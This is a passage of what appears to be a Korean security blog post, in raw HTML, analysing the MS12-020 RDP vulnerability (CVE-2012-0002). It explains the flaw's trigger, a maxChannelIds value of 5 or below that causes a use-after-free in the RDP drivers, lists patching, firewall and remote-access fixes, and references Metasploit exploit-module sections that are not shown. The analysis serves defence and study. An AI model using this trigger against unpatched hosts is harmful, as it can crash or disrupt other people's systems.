360w,\n/static/9783993b41126d7246854b96881c1a44/d8f62/image51.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>파일<span class=\"token operator\">**</span>       <span class=\"token operator\">|</span> <span class=\"token operator\">**</span>내용<span class=\"token operator\">**</span>                                           <span class=\"token operator\">|</span>\n<span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span><span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>RDPWD<span class=\"token punctuation\">.</span>sys<span class=\"token operator\">**</span>  <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   RDP 터미널 스택 드라이버                       <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>termdd<span class=\"token punctuation\">.</span>sys<span class=\"token operator\">**</span> <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   RDP의 구성 요소 및 터미널 서버 드라이버        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>                                                    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   마우스 및 키보드 드라이버는 termdd<span class=\"token punctuation\">.</span>sys를 통해  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>     통신한다<span class=\"token punctuation\">.</span>                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>                                                    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   마우스 및 키보드 작업에 대한 메시지를 RDP      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>     드라이버와 주고받는다<span class=\"token punctuation\">.</span>                         <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>                                                    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   RDP 클라이언트 세션을 원격으로 사용하고        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>     커뮤니케이션이 가능하다<span class=\"token punctuation\">.</span>                       <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></code></pre></div>\n<p><strong>7. 오류 발생 흐름도</strong>\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADkElEQVQ4y2WSa0xTBxiG31M6fijBXZi7hEHvp6c950BbSk/XQNnmZYpkQWFT6YQxpkRkErOY6calA7kUOCb+mMPL9mObJhhNxtwwG4smDipDjXPoRgNMhUY3bAKMEETabzm6mBm+5Pn35cl3ecFaMsFZXQlWXkoXBInjBTcriG4TL7p1GaJbJ/KSneclu4WXHDpTujFZL+qMrF3keMnBWaU0jpecLJcZ99AjAWmOnDgAqCrKxcnmUnxZX4of5K04daQco++9hXOrclHtzUXnuwU4u6U6adxXbu96R06o3lWG5ak2WMSXodVboTeKMFsyAZZzdulNjo5A5XothZqeudv90XP3zuxZPvt385O0vcg74ytmCVC1/jy8Tb45e0v+c2aweXTmRm1/eF3j7/+g6mRvnEbLQWcQYOacQJZ37cjKNYX0Vc2mYzTU0TjX196+EJRbaSDQ+teBrQdvbyhOARGartxp3R+eo2+7z1Pb+Bz5r0a2+69Pov63u2rO6sZDlJVtWf0OZw49nyK+UvJmPogINHsG7U2VwFLTi7CvXtLS0Ym9wXDWvmuRo+0Dtw40DEYO1Zy/aavpG0Nt3xiD/5fOYLO/lMpLNpvnWeAJfCF/zAQ+3MHEL9HALrotNoszSemrH11AU2gKB4MhNIamUXchjLqLdxj/wO3HfNDq05GcYoWOlVCxcQ2IvsFqbzajMTqV77OsxfWUmPkaKo6dVTWHptSf9o+oG4em1LUXwszeSxPAEGHYtw3jvjLsev8wlM+o/gOPMD+CM3Oup5N1NpTmr8D94+Ug6kGsZCMTKypiCMDn18IqEDHKndsmKQ4GowNmThG5HmBkHWAFF2MWXMhYtTJJdOfEr12RDaJ8kD8PUYsPsYJCxDZtBsUnorN3EATEE7CsZZoeX18RmswZKhObAdbsLDBYHKcNZruARB51BQ4V7V7HRD2bEV1f+MJ8cYlGEbVeDO/ZH5rsCQxPf9dwdeL4ImGaLUstpHsgiO6a7FffoOINeUG6LAfm+9rkaG+LHL0sB2JHK76Olr2drczTdGP2yqHhCJ0IDtK+8XlaJBTSPGqr4IaFl3Z7sl6nDKf3J6IJ1diJHcuiPTsTYqcrE+eoJZ5US9F9fwF1f0w3yNcnLn32y8i5T4amf1wkNBjtMJgcYLlMe6pW3KLR29xEfkS6qkDBDxD7ficW7tViwpPHKJk9peT2AWH8SoR/AQaCd0YA0iH7AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image52\"\n        title=\"image52\"\n        src=\"/static/ac276d6e7746d2888cb961261912dfc0/d8f62/image52.png\"\n        srcset=\"/static/ac276d6e7746d2888cb961261912dfc0/e9ff0/image52.png 180w,\n/static/ac276d6e7746d2888cb961261912dfc0/f21e7/image52.png 360w,\n/static/ac276d6e7746d2888cb961261912dfc0/d8f62/image52.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Luigi Auriemma가 처음 보고한 바와 같이 Use-After-Free 취약성은 5이하의\n값으로 설정되었을 때 T.125 ConnectMCSPDU 패킷의 maxChannelids 필드에서\n오류가 발생한다는 사실을 알 수 있다. 해당 문제는\nRDPWD!NM_Disconnect시작하는 동안 사용자의 접속을 끊고 발생되지만 메모리\n덤프를 통해서 알아본 결과 exploit 코드로 인해 발생하는 문제는\ntermdd!IcaBufferAlloc 에 표시된 것을 확인할 수 있다.</p>\n<h1 id=\"결론\" style=\"position:relative;\"><a href=\"#%EA%B2%B0%EB%A1%A0\" aria-label=\"결론 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>결론</h1>\n<p>CVE-2012-0002는 2012년에 발생하였었던 취약점이었지만 현재 사회에서 원격\n통신 비중이 늘어나면서 발생할 수 있는 취약점이기에 간과해서는 안된다.\n많은 사용자들은 RDP 기반의 애플리케이션을 사용함에 있어서 보안성과\n중요성을 크게 느끼지 못해 비 정기적인 보안 업데이트를 소홀히 하면 그\n위협은 MS 취약점뿐만 아니라 그 이상이 될 수 있다.</p>\n<p>중요한 것은 과거에 발생했던 취약점이더라도 해도 보안은 작은 결\n함으로부터 시작되기 때문에 지속적으로 새로운 취약점과 잠재적인 보안\n위험에 대한 지속적인 관심을 갖어야 한다. 단순히 안티바이러스를\n설치했다고 해서 해결할 수 있는 부분이 아니다.</p>\n<h1 id=\"대응-방안\" style=\"position:relative;\"><a href=\"#%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88\" aria-label=\"대응 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>대응 방안</h1>\n<h2 id=\"보안-업데이트-설치\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%EC%95%88-%EC%97%85%EB%8D%B0%EC%9D%B4%ED%8A%B8-%EC%84%A4%EC%B9%98\" aria-label=\"보안 업데이트 설치 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보안 업데이트 설치</h2>\n<p><strong>1. 최신 보안 패치 설치</strong></p>\n<p>윈도우 명령어 wmic qfe | find “KB2621440” 사용하여 MS12-020 보안 취약점\n업데이트가 설치되었는지 확인한다. 미설치시 업데이트를 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 599px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 55.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABuElEQVQoz42Ra2vbMBSGTf7JaOc4o2vc0bF9HoPBOpYv+7OlW3NrWdakSe0srms7TS/EXuq75YssWdJwPBjpKOzhHJAOvO+RzuEOO91e77jb+dptH7W/HXbbRye949N++7TfGY8G49Fgcv7j4vxMGg/lyXAw6kvSZCpLN4v597MhF4ap46QIEUKI67q+7+UQwiyDJRmllG1QXqsiAICL4xSAHGO6mGvDwYkynejqVFWky5mkKvKVImvqT1WR57piXM0MbTbXlYWhXBuXF+MRRwipPJemqaqqZVlB4EGYPvyyfM8lBcph4tirLI2jwPNdhxQYwgyh3LZXHCFF9TSY50mSQghV/Ua7thTtTl9Ylg3urNC4fbhfhaYTmw4IQIIQYozFAJTiP79Ze2CMP33+si282hHfPm/sCTv7jd03z+rNLUGsv3y9/WLv3fsPvu8zxsIw+FeMeJ7nOK5Wq3GbVBWhzsMsZYxFUfRYXBRFq9Xieb7ZbO5uIoqiIDQODj4mSfxY/J9QSqsZAxD9nTYtIWUW5c7X56eCrjuHHMphgTEj1A7se/PWXC4dx4ZZmsPsqYAwxTj3POc380IbM+F4kMMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image53\"\n        title=\"image53\"\n        src=\"/static/dac3e440d0f201d2b7abee615cd2f814/43142/image53.png\"\n        srcset=\"/static/dac3e440d0f201d2b7abee615cd2f814/e9ff0/image53.png 180w,\n/static/dac3e440d0f201d2b7abee615cd2f814/f21e7/image53.png 360w,\n/static/dac3e440d0f201d2b7abee615cd2f814/43142/image53.png 599w\"\n        sizes=\"(max-width: 599px) 100vw, 599px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>마이크로소프트 문서 사이트로 접속하여 점검하고 자하는 OS를 찾아 패치를\n진행하면 되겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">// 마이크로소프트 MS12-020 보안 패치\n\nhttps://docs.microsoft.com/ko-kr/security-updates/SecurityBulletins/2012/ms12-020</code></pre></div>\n<p><strong>2. 방화벽 작동</strong></p>\n<p>윈도우 계열의 운영체제에서 제공하는 방화벽은 항상 동작하게 한다.\n기본적인 패킷 필터링 기능을 제공하기 때문에 근본적인 침입 차단은 막을 수\n있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAB1UlEQVQoz23Q6W4TMRAA4Lz/E/AIVJSqQpUaRb1IKCFAWjWNWo5cu5v1nrZ317fXB9pNBUIwskbzw59nPINXr4dvToZHb8+Pjs+PT0cn7y5Oz66GF7ej6+nl+9nV5MvN7dfx9G7y6f7D5/uL2Wx69zRf/lyF6dnoZsCZwog566SSaRqjMqtQgcqc08YaZVpplDBaeO/6Y723zhnvfRhGg2hfrNaoRLLKyqeH1WabZ3lVN1RIJaSSSuvW6NZY5w7auU5775MEDIIoD3e49b4aj1eX10Gardcb0rD+oiW7DXx8gMuFrirve9qlLgMABsYYrVrvPZ3Pd5OPQULKgsEsjtbLOozSb8/4+w+y3ao8F1neBIHhvKMH7Jx11nrv68Uimk4RabV2okiDaIdwTRgjjFeEEMq40gxjU9d/4b72jBBUlr7/mIGoSDJKqbNWShnv4wrjumkYQpbS/2HGIUSHGqe7582yLGDXklIhhNaaCQEBaOva/4u11oLzw0pUWe6jCGEshCCENg3hgkulOcamaf50llK2rfG/o8cGwjLNtFLdQ93Ye9I0lDKBsSXkBSdgkCQQxJBSrtVLaK1lXbMYyDzvl5wxAHiSUABEkihKlVLO2jAMfgF+jGYOrqDPhwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image54\"\n        title=\"image54\"\n        src=\"/static/a2423f8fa8aabca82482fb5fd0a94217/0c69d/image54.png\"\n        srcset=\"/static/a2423f8fa8aabca82482fb5fd0a94217/e9ff0/image54.png 180w,\n/static/a2423f8fa8aabca82482fb5fd0a94217/f21e7/image54.png 360w,\n/static/a2423f8fa8aabca82482fb5fd0a94217/0c69d/image54.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. 원격 시스템 해제</strong></p>\n<p>이 컴퓨터에 대한 원격 지원 연결 허용 옵션 해제, 이 컴퓨터에 대한 원격\n연결 허용 안 함 선택 설정을 함으로써 MS12-020 취약점의 근본적인 차단이\n가능하다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAB8klEQVQoz02QSXLaUBCGdb+cIQfIAbKNT5B1ttmkKq4M2NgQGzNoQhKSQAM2LsqUk4AYJKFnSGJJvKlTQnHwX391vUV/3f0/Qde1dqctiU1ZbMpSU1M7tqnZljboG86g5zqm51qeY/qu5buWMVD9oXt7cx1M7+WuIWxCtI1/A/A8z+fBPA4jFEbbBPEdPphSzhnnjLJSHADW60RYjCar8WK3RiTLwlWoS8bxp3rltFWtSY2W3u35puWhxQIA6F4AUK+cvTl61VBUgfNiDDDG0xSybDF0pK8f9VrFujwzL6rXSsPticl8BgCcc8YYABy9PX75+sW79x8EVpxU8IQQjvFyPNJE0ZCkosqSZyq21olnP8sGQilwFv/KenezKIoFvh8GABiTeTD/PvJMreX31RtHHzqaN9D7hpgE0/1xjP9TgWw3m2cwwVEU39s99fyLWj/p1k/Mq/OBpTimnMymZebyuzDG+Y6gJDnAlNJgFkxcW25Um9XP0rdTtVmzDNGzVfSUuewkhKQZQQk6wDuMw2U4GXrNq0ZXaRl6R9fasnipdC7i6Y+SoU8CgIcHJGRZjgkpIz3+SYPx7dg173zb0WXXUIaW5nQ729Xy+ebyUWQOVygMN4xRQghjlO5ykqYkfdzXwjRLKd5RSv6bEMw5R2j9F6eES/AkO9ydAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image55\"\n        title=\"image55\"\n        src=\"/static/485a12f58acad3f553a6df8c45a677cc/0c69d/image55.png\"\n        srcset=\"/static/485a12f58acad3f553a6df8c45a677cc/e9ff0/image55.png 180w,\n/static/485a12f58acad3f553a6df8c45a677cc/f21e7/image55.png 360w,\n/static/485a12f58acad3f553a6df8c45a677cc/0c69d/image55.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h2>\n<p><a href=\"https://docs\">https://docs</a>.<br>\nmicrosoft.com/ko-kr/security-updates/SecurityBulletins/2012/ms12-020</p>\n<p>(Microsoft — MS12-020 보안 패치)</p>\n<p><a href=\"https://docs.microsoft.com/en-us/windows\">https://docs.microsoft.com/en-us/windows</a><br>\n-hardware/drivers/debugger/bug-check-0x3b—system-service-exception</p>\n<p>(Microsfot — BSOD Bug check)</p>\n<p><a href=\"https://support.microsoft\">https://support.microsoft</a><br>\n.com/ko-kr/help/186607/understanding-the-remote-desktop-protocol-rdp</p>\n<p>(Microsfot — RDP 이해)</p>\n<p><a href=\"https://docs.microsoft\">https://docs.microsoft</a><br>\n.com/en-us/windows/win32/termserv/terminal-services-virtual-channels</p>\n<p>(Microsfot — RDP 가상 채널)</p>\n<p><a href=\"https://docs.microsoft.com/en-us/openspe\">https://docs.microsoft.com/en-us/openspe</a><br>\ncs/windows_protocols/ms-rdpbcgr/18a27ef9-6f9a-4501-b000-94b1fe3c2c10</p>\n<p>(Microsfot — X.224)</p>\n<p><a href=\"https://docs.microsoft.com/en-us/openspe\">https://docs.microsoft.com/en-us/openspe</a><br>\ncs/windows_protocols/ms-rdpbcgr/023f1e69-cfe8-4ee6-9ee0-7e759fb4e4ee</p>\n<p>(Microsoft — RDP 연결 과정)</p>\n<p><a href=\"https://community.tenable.com/\">https://community.tenable.com/</a></p>\n<p>(Tenble — Community)</p>\n<p><a href=\"https://osqa-ask.wireshark.org/questions/\">https://osqa-ask.wireshark.org/questions/</a></p>\n<p>(Wireshark — Question)</p>\n<p><a href=\"https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator\">https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator</a></p>\n<p>(NVD)</p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#metasploit-%EC%B7%A8%EC%95%BD%EC%84%B1-%ED%85%8C%EC%8A%A4%ED%8A%B8\">Metasploit 취약성 테스트</a></p>\n<ul>\n<li><a href=\"#nessus-db-%EC%A0%95%EB%B3%B4-%EB%82%B4%EB%B3%B4%EB%82%B4%EA%B8%B0\">Nessus DB 정보 내보내기</a></li>\n<li><a href=\"#metasploit-workspace\">Metasploit workspace</a></li>\n<li><a href=\"#metasploit-db-%EC%97%B0%EA%B2%B0-%EC%83%81%ED%83%9C-%ED%99%95%EC%9D%B8-%EB%B0%8F-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0\">Metasploit DB 연결 상태 확인 및 가져오기</a></li>\n<li><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%A0%95%EB%B3%B4-%ED%99%95%EC%9D%B8\">점검 대상 서비스 정보 확인</a></li>\n<li><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%ED%98%B8%EC%8A%A4%ED%8A%B8-%EC%A0%95%EB%B3%B4\">점검 대상 호스트 정보</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B2%80%EC%83%89\">취약점 검색</a></li>\n<li><a href=\"#ms12_020_maxchannelids-%EB%AA%A8%EB%93%88\">ms12_020_maxchannelids 모듈</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%AA%A8%EB%93%88-%EC%98%B5%EC%85%98-%EC%84%A4%EC%A0%95\">모듈 옵션 설정</a></p>\n</li>\n<li>\n<p><a 